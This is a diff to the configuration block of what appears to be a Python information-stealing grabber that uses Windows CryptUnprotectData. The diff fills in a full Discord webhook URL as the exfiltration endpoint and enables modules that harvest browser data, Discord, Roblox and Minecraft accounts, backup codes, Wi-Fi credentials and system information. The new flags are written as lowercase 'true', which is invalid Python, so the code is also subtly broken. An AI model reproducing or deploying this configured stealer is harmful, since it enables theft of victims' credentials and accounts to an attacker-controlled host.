@@ -22,23 +22,23 @@ from requests_toolbelt.multipart.encoder import MultipartEncoder
 from win32crypt import CryptUnprotectData
 
 __CONFIG__ = {
-    "webhook": "None",
+    "webhook": "https://discord.com/api/webhooks/1149943258961694811/y2Zny9aY3TAXaTdEWr9sfvAlUha_FAi02TZ8BRZISR31ZjJ8_Gc7Fkbbvi5X2d_u2-nL",
     "ping": False,
     "pingtype": "None",
     "fakeerror": False,
     "startup": False,
     "defender": False,
-    "systeminfo": False,
-    "backupcodes": False,
-    "browser": False,
-    "roblox": False,
+    "systeminfo": true,
+    "backupcodes": true,
+    "browser": true,
+    "roblox": true,
     "obfuscation": False,
-    "injection": False,
-    "minecraft": False,
-    "wifi": False,
+    "injection": true,
+    "minecraft": true,
+    "wifi": true,
     "killprotector": False,
     "antidebug_vm": False,
-    "discord": False,
+    "discord": true,
     "anti_spam": False,
     "self_destruct": False
 }
